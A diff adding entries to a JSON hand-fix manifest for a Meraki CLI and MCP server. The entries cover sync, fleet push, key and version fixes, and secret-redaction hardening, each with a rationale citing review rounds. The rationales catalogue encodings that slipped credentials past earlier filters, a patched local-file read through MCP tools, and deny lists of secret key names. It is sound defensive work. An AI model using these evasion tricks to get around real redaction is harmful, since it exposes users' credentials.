+     "contains": "func TestSyncStrictFailsOnStuckPagination(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-sync-record-object",
+   "summary": "sync stores an object page that names its own network or device (networkId/serial) as one record, ahead of the generic single-array-sibling heuristic, so its only array of sub-objects is not taken for the records and an empty array does not read as an empty page. fleet fanout (merakiGetAll) applies the same rule",
+   "why": "GET /organizations/{organizationId}/appliance/devices/redundancy/byNetwork (MX warm-spare settings) is documented as one object per network with a single array (designations). The generated extractor's single-array-sibling heuristic stored only {serial, priority} and dropped networkId, mode and uplink settings, with sync exiting 0. Found by Codex review (2026-10-14). Applied only where that heuristic fires, so every other envelope shape is unchanged. Helper merakiRecordObject is hand-authored in internal/cli/meraki_link_pagination.go; the call site in generated sync.go is re-applied by the factory's tools/apply_handfixes.py. TestSyncKeepsMerakiRecordObject fails without it (proven). Round 8 (2026-10-14): applied only where the heuristic fired, a network with warm spare disabled (designations: []) still read as an empty page and its earlier active-active row was never replaced; the check now runs before the heuristic. Across every synced resource's documented example it fires only for redundancy byNetwork. Round 9 (2026-10-14): the fleet fanout twin (merakiGetAll) still ran the envelope heuristic first and reported items_returned 0 for a disabled warm-spare network; it now checks merakiRecordObject first. TestMerakiGetAllCountsDisabledWarmSpareAsRecord fails without it (proven).",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable; press retro: never treat an object carrying its own identity as an envelope.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if merakiRecordObject(envelope) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func merakiRecordObject(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_envelope_array_test.go",
+     "contains": "func TestSyncKeepsMerakiRecordObject(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "if json.Unmarshal(data, &obj) == nil && !merakiRecordObject(obj) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination_test.go",
+     "contains": "func TestMerakiGetAllCountsDisabledWarmSpareAsRecord(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-fleet-push-exit",
+   "summary": "fleet push --apply exits 6 (partial failure) when a target's change did not land - batch rejected, failed, pending after --wait, current settings unreadable, or an organization's network list unreadable (an org with API access disabled stays a warning) - and the error gives the true count and names the first 20 targets (the MCP tool returns only stderr on a non-zero exit); the targeting guard judges normalized filters, so a blank --org/--network/--network-tag/--product-type is not a target",
+   "why": "Codex review (2026-10-14): a batch POST answered HTTP 400 and fleet push --apply printed 'rejected' but exited 0 with empty stderr, so automation and the companion MCP tool reported success although nothing changed. fleet_push.go is hand-authored (novel command); TestFleetPushApplyExitsPartialOnRejectedBatch fails on the prior version (proven). Codex round 2 + adversarial round 8 (2026-10-14): a target whose settings GET returned 403 got action 'error', no batch, and exit 0; and the MCP fleet_push tool, which drops stdout on a non-zero exit, gave the agent no per-network status. TestFleetPushApplyExitsPartialOnUnreadableTarget fails on the prior version (proven). An org whose network list fails stays a stderr warning, as in every fleet command. Codex round 3 + adversarial round 9 (2026-10-14): when every org's network-list read failed, --apply exited 0 with [] and no change made; and the error used the length of the capped name list as its count, so 50 failures read as 21. pushNotCompleted now also counts org planning failures and returns the true total. TestFleetPushApplyExitsPartialWhenOrgUnreadable fails on the prior version (proven); TestPushNotCompletedCountsPastTheNameCap pins the count. Codex round 8 (2026-10-14): `fleet push --org \" \" --apply` passed the 'untargeted pushes are refused' guard, then fleetOrgFilter dropped the blank value and the push went to every network in every org. Filters are now split/trimmed before the guard (pushFilterValues); TestFleetPushRefusesBlankTargets fails without it (proven).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "if failed, n := pushNotCompleted(rows, outcomes); n > 0 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "if oc.Err != nil && !errors.Is(oc.Err, errOrgAPIDisabled) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushApplyExitsPartialOnRejectedBatch(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushApplyExitsPartialOnUnreadableTarget(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushApplyExitsPartialWhenOrgUnreadable(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestPushNotCompletedCountsPastTheNameCap(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "orgFilter, networkFilter = pushFilterValues(orgFilter), pushFilterValues(networkFilter)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushRefusesBlankTargets(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-nullable-composite-key",
+   "summary": "configuration_changes and intrusion-rule rows are keyed positionally with empty slots for parts Meraki leaves null (ts+networkId+ssidNumber+adminId+page+label; ruleId+policy.id), ahead of the all-parts-required generated override",
+   "why": "Codex round 2 (2026-10-14): a configuration change made by Meraki support or an automated process has adminId null, so the generated ts+adminId+page+label composite failed and the fallback keyed on network+timestamp: two changes in the same second on one network (an L3 and an L7 rule edit) overwrote each other and sync exited 0. Round 8 found the same shape on intrusion rules without policy.id, which fell to the generic gid fallback (gid is 1 for nearly every rule). Helper merakiNullableCompositeID is hand-authored in internal/store/meraki_identity.go; the call site at the top of generated ExtractResourceID is re-applied by the factory's tools/apply_handfixes.py. TestMerakiNullableCompositeKey fails on the prior code (proven).",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable (x-resource-id has no optional-part syntax); press retro: composite keys should tolerate null parts.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if s := merakiNullableCompositeID(resourceType, obj); s != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity.go",
+     "contains": "func merakiNullableCompositeID(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity_test.go",
+     "contains": "func TestMerakiNullableCompositeKey(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-mcp-version-ldflags",
+   "summary": "cisco-meraki-mcp declares var version (package main) and passes it to server.NewMCPServer, so release.yml's -X main.version stamps serverInfo.version",
+   "why": "Codex round 2 (2026-10-14): the generated MCP main.go kept the 'version is ... overridable via ldflags' comment but hard-coded \"0.0.0-dev\" with no var, so -X main.version was silently ignored and the release workflow's serverInfo.version probe would fail the release. Every other connector's MCP main.go declares the var. Receipt: built with -X main.version=0.1.0, initialize returns serverInfo.version 0.1.0. Re-applied by the factory's tools/apply_handfixes.py.",
+   "status": "active",
+   "spec_encode_followup": "Press retro: the MCP main template lost its version var under 4.33.5 for this print.",
+   "asserts": [
+    {
+     "file": "cli/cmd/cisco-meraki-mcp/main.go",
+     "contains": "var version = \"0.0.0-dev\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-mcp/main.go",
+     "contains": "\t\tversion,\n",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "mcp-filesystem-source-gate",
+   "summary": "The MCP shell-out layer refuses local-file SOURCE flags (teach --playbook-file / --playbook-notes-file, teach-playbook --notes-file / --playbook-file, import --input) by name, fleet push --body accepts only an inline JSON object over MCP (mcp:inline-only-flags annotation + guardInlineOnlyFlags), and UnblockedFilesystemPathFlags applies the fleet's usage-text rule to the live command tree so a regenerated local-path flag fails the build",
+   "why": "Adversarial round 9 (2026-10-14): press 4.33.5's restructured cobratree carries only write-destination names in blockedDestinationFlags, so the fleet #193 fix (closed 2026-08-31; 65 of 68 connectors carry filesystemPathFlagPhrases) did not reach this print. With CISCO_MERAKI_MCP_READ_ONLY=1, MCP teach_playbook {notes-file:/path/secret.txt} stored the file and playbook_list returned its contents, and MCP fleet_push {body:'/path/creds.json'} returned the file's JSON in each preview row's desired field: an arbitrary local-file read by the server account. Ported the fleet rule into the 4.33.5 layout: the name floor in shellout.go, the inline-only guard wired in walker.go, the annotation on fleet push, and TestNoShellOutToolCanDirectAFilesystemPath + TestFleetPushBodyIsInlineOnlyOverMCP (both fail with the fix removed, proven). The generated-file edits are re-applied by the factory's tools/apply_handfixes.py.",
+   "status": "active",
+   "spec_encode_followup": "Press-side: the 4.33.5 cobratree dropped the #193 usage-text rule; a reprint needs it back in the generator.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"notes-file\":          true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"playbook-file\":       true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "func UnblockedFilesystemPathFlags(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "func guardInlineOnlyFlags(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/walker.go",
+     "contains": "guardInlineOnlyFlags(cmd, shellOutToCLI(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "\"mcp:inline-only-flags\": \"body\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
+     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
+     "contains": "func TestFleetPushBodyIsInlineOnlyOverMCP(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-mirror-redacts-secrets",
+   "summary": "Every local-mirror write (sync, read write-through, mutation write-through; generic, typed and batch upserts) passes through mergeIncomingResourceData, which now replaces credential values (psk, passphrase, password, secret, sharedSecret, SNMP community strings and v3 passwords, API keys, tokens, by key name and suffix) with [redacted] before storing. License keys are kept on purpose. ExtractResourceID also refuses an identity that contains a credential value. Change-log oldValue/newValue (an API change's JSON request body, or a secret-labelled UI value) are redacted in the mirror and in fleet changes / fleet blame output. A JSON-looking change-log value that does not parse (cut off) is withheld whole as [redacted: cut-off JSON]; the textual scrub is gone. Webhook HTTP server IDs (in paths) and url= query values are replaced with [redacted:<128-bit sha256 prefix>]; a url= value (name possibly percent-encoded) runs to the end of the string, pagination after it included: no encoding inference decides the boundary (Codex rounds 14-16 broke each heuristic: raw, partly and double-encoded receivers). The url= scrub applies only to API request queryString/path fields, labels and row-ID parts; every other string gets the HTTP-server-ID scrub only (a splash page ?url= redirect is kept). Nullable composite IDs are not re-scrubbed whole after their parts. HTTP server paths and secret labels are matched percent-decoded (web%68ooks). The scrub runs on decoded string leaves, never on serialized JSON (re-scrubbing escaped JSON corrupted it). api_requests rows key on the full request tuple (ts, admin, method, host, path, queryString, source IP, user agent, response code, client, operation). Composite row identities scrub each part before joining, so the timestamp stays visible and two requests to one receiver keep two rows (Codex round 14 brute-forced a 32-bit prefix collision). fleet push previews percent-decode --path before the webhook check (web%68ooks). Webhook keyword checks (change label, change value, push path) run on a normalized form with %XX and JSON \\uXXXX escapes decoded and backslashes dropped (Codex round 17: web%68\\u006foks). The url= value runs to the very end of the string and matches after ';' or whitespace too; change-log labels get it in the mirror as in fleet changes (adversarial round 24). configuration_changes rows key on ts, network, SSID, admin, page, label, client ID and a 64-bit hash of the REDACTED old/new values (Codex round 18: two changes to one setting in one microsecond; a PSK never enters the hash). Any base64 token (16+ chars) that decodes to an http(s) URL is withheld wherever it appears: that is what an HTTP server ID is, so a bare one in an alert-recipient change value is covered. Backstop: when a string still holding % or backslash escapes names an HTTP server ID or url= value only in its normalized (recursively decoded) form, the whole string is withheld, since there is no raw span to redact (Codex round 21: web%2568ooks with a fully percent-encoded ID). redactMerakiValue classifies every key of an object before rewriting any (map order is random; a url=-scrubbed label must not unclassify its oldValue/newValue - adversarial round 25). A URL whose query names a signature, token or key (X-Amz-Signature, sig, token, code, key, ...) is a capability link and is withheld wherever strings are scrubbed, fleet push previews included; 'token' is a secret change-label word (Codex round 23). The backstop is general: on the decoded string (case kept, already-scrubbed tokens masked) any HTTP server ID (any number of slashes), signed URL, base64 URL or (url scrub) url= value withholds the whole string; the raw HTTP-server-ID class includes a literal backslash (adversarial round 26, Codex round 24).",
+   "why": "Adversarial round 9 (2026-10-14): a routine `networks wireless update-network-ssid` stored the PSK and RADIUS secret its response echoes, and `search`, `analytics` and MCP sql (Allow tier, available in MCP read-only mode) returned them, contradicting governance ('credentials are only ever read live'). A default --data-source auto GET of a secret-bearing path wrote through the same way. The redaction sits at the one funnel every upsert uses, so the typed upsert<X>Tx writers cannot bypass it (the connectsecure lesson). Key set derived from a scan of every property name in the vendor spec. TestMirrorNeverStoresMerakiSecrets drives batch, generic and typed upserts with a sentinel and fails with the wrapper removed (proven). Round 10 + Codex round 4 (2026-10-14): ID resolution ran on the unredacted object before the funnel, so `administered generate-identities-me-api-keys` ({\"key\": \"<new API key>\"}, no other identity) stored the key itself as resources.id and resources_fts.id, readable by MCP sql. ExtractResourceID now returns \"\" for an id carrying a secret value (merakiIDCarriesSecret); the test asserts ids and FTS ids too and fails without the guard (proven). The generated TestUpsertBatch_GenericFallbackList asserted that a bare {\"key\": \"value\"} resolves as an id; for Meraki that shape is an API key, so \"key\" is dropped from its loop (a regeneration restores the old list and the test then fails, which is the signal). Codex round 5 (2026-10-14): configuration_changes rows carry an API PUT's request body as a JSON-encoded string in oldValue/newValue, so a PSK set over the API reached the mirror (and fleet changes / blame output, both Allow tier) inside a string the key-name walk never parsed. JSON strings are now parsed and redacted, secret-labelled values blanked; TestChangeLogValuesNeverCarrySecrets fails without it (proven). Round 12 (2026-10-14): the secret-label rule matched substrings and blanked audit values such as 'Password expiration'; round 13 showed a suffix match failed open on 'Pre-shared key (PSK)', so it is substring-based again with a password-policy exclusion list (expiration, length, ...). A change-log body that is not valid JSON (truncated) is scrubbed textually by secret key name. The raw change log (organizations configuration-changes get-organization, fleet fanout and MCP execute at configurationChanges) stays unredacted output and is listed as a Credential-tier read in governance.md, README.md and page.json. Round 13: governance said no credential read is synced, but the change log is (redacted); and the textual scrub missed a value ending in a lone backslash. Both fixed; the test covers 'Pre-shared key (PSK)' and the lone-backslash body (each fails on the round-12 code, proven). Codex round 9 (2026-10-14): a duplicate secret key ({\"psk\":\"x\",\"psk\":\"\"}) left the original bytes (with the first secret) unchanged because the decoder keeps the last duplicate, and a truncated body with a \\u-escaped key (\"\\u0070sk\") passed the textual scrub. Any secret-named key now forces a re-encode, and the textual path decodes ASCII \\u escapes first. Round 15: a policy word only exempts a password label when it follows the word password. Each case leaks on the prior code (proven) and is in TestChangeLogValuesNeverCarrySecrets. Codex round 10 (2026-10-14): a duplicate CONTAINER key ({\"radiusServers\":[{\"secret\":\"s\"}],\"radiusServers\":[]}) hid the nested secret from the walk, so the bytes were kept and the secret reached SQLite and fleet changes output. Any repeated key at any depth (merakiHasDuplicateKey) now forces a re-encode of the decoded value, and top-level input that is not valid JSON (trailing data after a value) is scrubbed textually instead of kept. The new cases fail with the duplicate check removed (proven); TestRedactKeepsCleanJSONByteForByte pins that reused keys in sibling objects are not duplicates. Adversarial round 16 (2026-10-14): the 107c3a63e secret-key branch ended in `continue` for every value, so an OBJECT under a secret-named key was no longer walked and md5AuthenticationKey.passphrase / parsedToken.hashedToken reached the mirror and fleet changes; a non-string child is now recursed before the continue. The duplicate-key walker now uses UseNumber (a float64-overflowing number such as 1e400 ended the walk early) and fails closed on any token error. Both cases fail with the fix removed (proven). Adversarial round 17 (2026-10-14): a write's response is stored too (writeMutationResponseToStore, ~400 commands), and a webhook payload template echoes headers as name/template pairs, so {\"name\":\"Authorization\",\"template\":\"Basic ...\"} was stored and returned by search. merakiSecretField now also redacts the value/template of a pair whose name is a credential (Authorization, X-Api-Key, Cookie, ...), and a container under a secret-named key has every string redacted (fail closed: {\"psk\":[\"x\"]}, {\"token\":{\"value\":\"x\"}}). The ID guard uses the same predicate. Both rules fail with their code removed (proven); clean name/value pairs (Content-Type, Model) stay byte-identical. Adversarial round 18 (2026-10-14): a change-log body that is not valid JSON (cut off) went through the textual scrub, which matched key names only, so a header pair's Authorization template survived into SQLite and fleet changes / blame; and merakiSecretName missed header names ending in -Key (x-functions-key, Ocp-Apim-Subscription-Key, X-Auth-Key, X-Insert-Key). The textual path now scrubs every value/template string when any name in the text is a credential name (fail closed), and any pair name ending in key, or containing auth, credential or signature, is a credential name. Each case leaks on the round-17 code (proven); a clean cut-off body (Content-Type) is returned unchanged. Adversarial round 19 (2026-10-14): the textual scrub for cut-off bodies was bypassed again, by a nested body whose keys are escaped (\\\"token\\\":\\\"x\\\" inside a cut-off payload template) and, in valid JSON, by base64 headersFile/bodyFile. Rounds 9-19 kept finding a new textual bypass, so the scrub is deleted: a JSON-looking value that does not parse is replaced whole by RedactedCutOff (fail closed; the raw change log is a Credential-tier read), and a whole row that is not valid JSON (unreachable from sync) is stored as that marker string. headersFile and bodyFile are secret keys. Each rule fails with its code removed (proven); a bracketed label such as '[Default] Guest' (no quote) is kept. Adversarial round 20 + Codex round 11 (2026-10-14): key names were matched exactly, so api_key, access_token, accessToken, a PagerDuty routing_key and privateKey inside a payload-template body reached fleet changes / blame and the mirror, and a form-encoded body (token=...&user=...) was never parsed. Key names are now normalized (case, _, -, space) and any key ending in token or key is a secret (licenseKey excepted, kept on purpose); a change-log label naming a webhook withholds the old/new value whole (templates are free-form, an HTTP server URL is a credential); a JSON string directly inside an array is parsed; httpServerId(s) (base64 of the receiver URL) are secret keys. The cut-off rule now needs JSON-looking text ({\" , [\" , or a nested bracket with a quote), so an org named [Cedar] \"Clinic\" is kept. Each rule fails with its code removed (proven). Adversarial round 20 + Codex round 12 (2026-10-14): a webhook HTTP server ID is the base64 of the receiver URL, and change-log labels (PUT .../webhooks/httpServers/<id>) and API request paths carried it into the mirror, into row IDs and into fleet changes / fleet blame output; a webhook logs url= filter put the URL in API request query strings; an action-batch change value targeting /webhooks/ kept the receiver url and a form-encoded template token; and a fleet push preview printed the live PSK under current. ScrubMerakiURLSecrets now replaces HTTP server IDs and url= values in every stored string, in ExtractResourceID and in the fleet changes/blame labels, merakiSecretChange withholds any change value mentioning a webhook (also \\\\u-escaped, via a JSON round trip), and fleet push redacts current before printing. Round-20 P2s: a cut-off array starting with a scalar ([1,{\"psk\":...) is withheld, change-log values are skipped by merakiIDCarriesSecret (a '0'/'1' value made configuration_changes rows unkeyable), and _pp_ store fields are never secret keys. TestWebhookReceiverNeverReachesMirrorOrIDs, TestShortChangeValueDoesNotBreakIdentity, TestStoreSynthesizedKeysAreNotSecrets and TestFleetPushPreviewRedactsCurrentSecrets each fail with their fix removed (8 mutations, all proven). Adversarial round 21 + Codex round 13 (2026-10-14): an action batch's callback {url, httpServer.id} on a non-webhook resource survived (callback is now a secret container); the ID pattern stopped at '/', which standard base64 contains, and its constant replacement ate the '+ts' composite separator so webhook API requests collapsed into one row (the pattern now consumes the whole run and substitutes [redacted:<sha256 prefix>], idempotent on re-scrub); [null,{...] and [true,{...] cut-off arrays were kept (merakiBracketTag: only a bracketed name tag is not JSON); and a fleet push preview under a webhook path printed the HTTP server's plain url (every current string is redacted there). TestRound21ReceiverLeaks and TestFleetPushPreviewRedactsWebhookURL: 6 mutations, all proven.",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable; press retro: generated stores should redact x-sensitive response fields.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return RedactMerakiSecrets(s.mergeIncomingResourceDataUnredacted(tx, resourceType, id, incoming))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func RedactMerakiSecrets(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestMirrorNeverStoresMerakiSecrets(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/upsert_batch_test.go",
+     "contains": "\"guid\", \"api_id\", \"name\", \"slug\", \"code\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func RedactMerakiChangeValue(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_changes.go",
+     "contains": "OldValue: store.RedactMerakiChangeValue(ch.Label, ch.OldValue)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_blame.go",
+     "contains": "OldValue: store.RedactMerakiChangeValue(p.ch.Label, p.ch.OldValue)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestChangeLogValuesNeverCarrySecrets(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "for _, policy := range []string{\"expiration\", \"expiry\", \"length\", \"complexity\", \"history\", \"rotation\", \"strength\", \"lockout\", \"requirement\"} {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "if !changed && !merakiHasDuplicateKey(data) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestRedactKeepsCleanJSONByteForByte(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func merakiSecretField(k string, obj map[string]any) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "tv[k], _ = redactAllStrings(child)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "merakiSecretField(k, tv) && strings.Contains(id, s)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "return strings.HasSuffix(l, \"key\") || merakiSecretKeys[l]",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "\t\t\treturn RedactedCutOff",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "return json.RawMessage(strconv.Quote(RedactedCutOff))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "\"headersfile\":          true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "not_contains": "func merakiScrubText("
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "lower := merakiKeyNameNormalizer.Replace(strings.ToLower(name))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "var merakiSecretSuffixes = []string{\"password\", \"passphrase\", \"secret\", \"psk\", \"token\", \"key\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "\"shared key\", \"token\", \"webhook\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "s = ScrubMerakiURLSecrets(extractResourceIDUnguarded(resourceType, obj))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func ScrubMerakiURLSecrets(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func merakiSecretChange(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_changes.go",
+     "contains": "Label: store.ScrubMerakiURLSecrets(ch.Label)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_blame.go",
+     "contains": "Label: store.ScrubMerakiURLSecrets(p.ch.Label)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "store.RedactMerakiObject(cur, path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestWebhookReceiverNeverReachesMirrorOrIDs(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushPreviewRedactsCurrentSecrets(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "\"callback\":             true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func merakiBracketTag(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "return parts[1] + merakiRedactedHash(parts[2])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestRound21ReceiverLeaks(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushPreviewRedactsWebhookURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity.go",
+     "contains": "return ScrubMerakiURLSecrets(s)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity.go",
+     "contains": "values[i] = ScrubMerakiURLSecrets(s)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "hex.EncodeToString(sum[:16])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestCodexRound14ReceiverScrub(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestPushPreviewDecodesWebhookPath(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "(t[0] == '{' || t[0] == '[') && json.Valid([]byte(t)) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "l := merakiNormalized(label)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "merakiLoose(\"/webhooks/httpServers/\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity.go",
+     "contains": "\"api_requests\": {\"ts\", \"adminId\", \"method\", \"host\", \"path\", \"queryString\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestCodexRound15ReceiverScrub(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "var merakiRequestLogKeys = map[string]bool{\"querystring\": true, \"path\": true, \"label\": true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "return scrubMerakiHTTPServerIDs(RedactMerakiJSONString(s))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "s := merakiNullableCompositeID(resourceType, obj)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestCodexRound16URLValueRunsToEnd(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func merakiNormalized(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "return merakiSecretLabel(label) || strings.Contains(merakiNormalized(v), \"webhook\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestCodexRound17(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity.go",
+     "contains": "func merakiChangeValueFingerprint(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "return merakiWithholdIfLeft(s[:loc[1]]+merakiRedactedHash(s[loc[1]:]), true)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestCodexRound18ChangeIdentity(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
